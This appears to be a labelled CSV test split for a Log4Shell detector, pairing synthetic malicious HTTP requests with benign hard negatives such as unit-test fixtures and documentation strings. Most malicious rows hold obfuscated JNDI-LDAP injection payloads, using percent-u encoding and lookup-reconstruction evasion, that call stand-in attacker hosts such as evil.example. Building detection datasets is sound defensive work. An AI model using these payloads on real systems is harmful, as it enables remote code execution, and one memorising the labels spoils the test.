id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
OOD-900051,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.51 | X-Api-Version: %u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Flog4j-test.invalid%u002Fpercent-u%u007D,request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.51 | x-api-version: %u0024%u007bjndi%u003aldap%u003a%u002f%u002flog4j-test.invalid%u002fpercent-u%u007d,1,log4shell,iis_percent_u_encoding,header,ood_stress_test,critical
OOD-900167,2026-05-17,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900167,get /search?q=${jndi:ldap://evil.example/research}&intent=research http/1.1 trace_id=benign-ood-900167,0,benign,benign_encoded_search_query,mixed,ood_stress_test,low
OOD-900017,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://evil.example/charcode}&request_id=ood-900017 HTTP/1.1 Host: victim.local,get /api/audit?trace=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://evil.example/charcode}&request_id=ood-900017 http/1.1 host: victim.local,1,log4shell,charcode_lookup_reconstruction,query,ood_stress_test,critical
OOD-900259,2026-05-17,ood_stress_hard_negative,WARN unit-test fixture expected='${jndi:ldap://probe.example.net/fixture}' assertion=string_literal_only trace_id=benign-ood-900259,warn unit-test fixture expected='${jndi:ldap://probe.example.net/fixture}' assertion=string_literal_only trace_id=benign-ood-900259,0,benign,benign_unit_test_fixture,mixed,ood_stress_test,low
OOD-900282,2026-05-17,ood_stress_hard_negative,WARN unit-test fixture expected='${jndi:ldap://lab-callback.example.org/fixture}' assertion=string_literal_only trace_id=benign-ood-900282,warn unit-test fixture expected='${jndi:ldap://lab-callback.example.org/fixture}' assertion=string_literal_only trace_id=benign-ood-900282,0,benign,benign_unit_test_fixture,mixed,ood_stress_test,low
OOD-900100,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fprobe.example.net%u002Fpercent-u%u007D; sid=ood900100,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fprobe.example.net%u002fpercent-u%u007d; sid=ood900100,1,log4shell,iis_percent_u_encoding,cookie,ood_stress_test,critical
OOD-900038,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://attacker.evil.com/date-fragment}"",""host"":""attacker.evil.com""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://attacker.evil.com/date-fragment}"",""host"":""attacker.evil.com""}",1,log4shell,date_lookup_reconstruction,json,ood_stress_test,critical
OOD-900036,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://attacker.evil.com/unsupported-namespace}; sid=ood900036,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://attacker.evil.com/unsupported-namespace}; sid=ood900036,1,log4shell,unsupported_lookup_namespace,cookie,ood_stress_test,critical
OOD-900212,2026-05-17,ood_stress_hard_negative,WARN unit-test fixture expected='${jndi:ldap://log4j-test.invalid/fixture}' assertion=string_literal_only trace_id=benign-ood-900212,warn unit-test fixture expected='${jndi:ldap://log4j-test.invalid/fixture}' assertion=string_literal_only trace_id=benign-ood-900212,0,benign,benign_unit_test_fixture,mixed,ood_stress_test,low
OOD-900200,2026-05-17,ood_stress_hard_negative,DEBUG payload_sample=JHtqbmRpOmxkYXA6Ly9leGFtcGxlLmNvbS9hfQ== action=display_only decoded_by_ui=false trace_id=benign-ood-900200,debug payload_sample=jhtqbmrpomxkyxa6ly9legftcgxllmnvbs9hfq== action=display_only decoded_by_ui=false trace_id=benign-ood-900200,0,benign,benign_base64_artifact,mixed,ood_stress_test,low
OOD-900201,2026-05-17,ood_stress_hard_negative,"INFO rendered JSON string value=""\\${jndi:ldap://log4j-test.invalid/not-executed}"" source=documentation","info rendered json string value=""\\${jndi:ldap://log4j-test.invalid/not-executed}"" source=documentation",0,benign,benign_json_escaped_payload,mixed,ood_stress_test,low
OOD-900277,2026-05-17,ood_stress_hard_negative,INFO tutorial says type ${ then jndi then :ldap://lab-callback.example.org separately; not a runtime lookup,info tutorial says type ${ then jndi then :ldap://lab-callback.example.org separately; not a runtime lookup,0,benign,benign_fragmented_tutorial_text,mixed,ood_stress_test,low
OOD-900143,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.143 | X-Api-Version: ${jndi:l${sys:user.name:-d}ap://lab-callback.example.org/protocol-sys},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.143 | x-api-version: ${jndi:l${sys:user.name:-d}ap://lab-callback.example.org/protocol-sys},1,log4shell,protocol_fragment_sys_lookup,header,ood_stress_test,critical
OOD-900278,2026-05-17,ood_stress_hard_negative,INFO tutorial says type ${ then jndi then :ldap://lab-callback.example.org separately; not a runtime lookup trace_id=benign-ood-900278,info tutorial says type ${ then jndi then :ldap://lab-callback.example.org separately; not a runtime lookup trace_id=benign-ood-900278,0,benign,benign_fragmented_tutorial_text,mixed,ood_stress_test,low
OOD-900241,2026-05-17,ood_stress_hard_negative,GET /docs/log4shell?example=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fprobe.example.net%u002Fdoc%u007D&mode=render-only HTTP/1.1 Host: kb.local,get /docs/log4shell?example=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fprobe.example.net%u002fdoc%u007d&mode=render-only http/1.1 host: kb.local,0,benign,benign_percent_u_documentation,mixed,ood_stress_test,low
OOD-900059,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.59 | X-Api-Version: ${j${k8s:k5:-n}d${sd:k5:-i}:ldap://log4j-test.invalid/unsupported-namespace},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.59 | x-api-version: ${j${k8s:k5:-n}d${sd:k5:-i}:ldap://log4j-test.invalid/unsupported-namespace},1,log4shell,unsupported_lookup_namespace,header,ood_stress_test,critical
OOD-900126,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${j${sys:line.separator}ndi:ldap://lab-callback.example.org/sys-separator}"",""host"":""lab-callback.example.org""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${j${sys:line.separator}ndi:ldap://lab-callback.example.org/sys-separator}"",""host"":""lab-callback.example.org""}",1,log4shell,sys_lookup_separator,json,ood_stress_test,critical
OOD-900151,2026-05-17,ood_stress_hard_negative,DEBUG payload_sample=JHtqbmRpOmxkYXA6Ly9leGFtcGxlLmNvbS9hfQ== action=display_only decoded_by_ui=false trace_id=benign-ood-900151,debug payload_sample=jhtqbmrpomxkyxa6ly9legftcgxllmnvbs9hfq== action=display_only decoded_by_ui=false trace_id=benign-ood-900151,0,benign,benign_base64_artifact,mixed,ood_stress_test,low
OOD-900173,2026-05-17,ood_stress_hard_negative,DEBUG payload_sample=JHtqbmRpOmxkYXA6Ly9leGFtcGxlLmNvbS9hfQ== action=display_only decoded_by_ui=false,debug payload_sample=jhtqbmrpomxkyxa6ly9legftcgxllmnvbs9hfq== action=display_only decoded_by_ui=false,0,benign,benign_base64_artifact,mixed,ood_stress_test,low
OOD-900177,2026-05-17,ood_stress_hard_negative,"INFO rendered JSON string value=""\\${jndi:ldap://attacker.evil.com/not-executed}"" source=documentation","info rendered json string value=""\\${jndi:ldap://attacker.evil.com/not-executed}"" source=documentation",0,benign,benign_json_escaped_payload,mixed,ood_stress_test,low
OOD-900258,2026-05-17,ood_stress_hard_negative,WARN unit-test fixture expected='${jndi:ldap://probe.example.net/fixture}' assertion=string_literal_only trace_id=benign-ood-900258,warn unit-test fixture expected='${jndi:ldap://probe.example.net/fixture}' assertion=string_literal_only trace_id=benign-ood-900258,0,benign,benign_unit_test_fixture,mixed,ood_stress_test,low
OOD-900015,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.15 | X-Api-Version: ${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://evil.example/date-fragment},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.15 | x-api-version: ${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://evil.example/date-fragment},1,log4shell,date_lookup_reconstruction,header,ood_stress_test,critical
OOD-900018,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://evil.example/charcode}"",""host"":""evil.example""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://evil.example/charcode}"",""host"":""evil.example""}",1,log4shell,charcode_lookup_reconstruction,json,ood_stress_test,critical
OOD-900193,2026-05-17,ood_stress_hard_negative,GET /docs/log4shell?example=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Flog4j-test.invalid%u002Fdoc%u007D&mode=render-only HTTP/1.1 Host: kb.local,get /docs/log4shell?example=%u0024%u007bjndi%u003aldap%u003a%u002f%u002flog4j-test.invalid%u002fdoc%u007d&mode=render-only http/1.1 host: kb.local,0,benign,benign_percent_u_documentation,mixed,ood_stress_test,low
OOD-900047,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.47 | X-Api-Version: ${jndi:l${sys:user.name:-d}ap://attacker.evil.com/protocol-sys},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.47 | x-api-version: ${jndi:l${sys:user.name:-d}ap://attacker.evil.com/protocol-sys},1,log4shell,protocol_fragment_sys_lookup,header,ood_stress_test,critical
OOD-900069,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${jndi:l${sys:user.name:-d}ap://log4j-test.invalid/protocol-sys}&request_id=ood-900069 HTTP/1.1 Host: victim.local,get /api/audit?trace=${jndi:l${sys:user.name:-d}ap://log4j-test.invalid/protocol-sys}&request_id=ood-900069 http/1.1 host: victim.local,1,log4shell,protocol_fragment_sys_lookup,query,ood_stress_test,critical
OOD-900233,2026-05-17,ood_stress_hard_negative,WARN unit-test fixture expected='${jndi:ldap://callback.local/fixture}' assertion=string_literal_only,warn unit-test fixture expected='${jndi:ldap://callback.local/fixture}' assertion=string_literal_only,0,benign,benign_unit_test_fixture,mixed,ood_stress_test,low
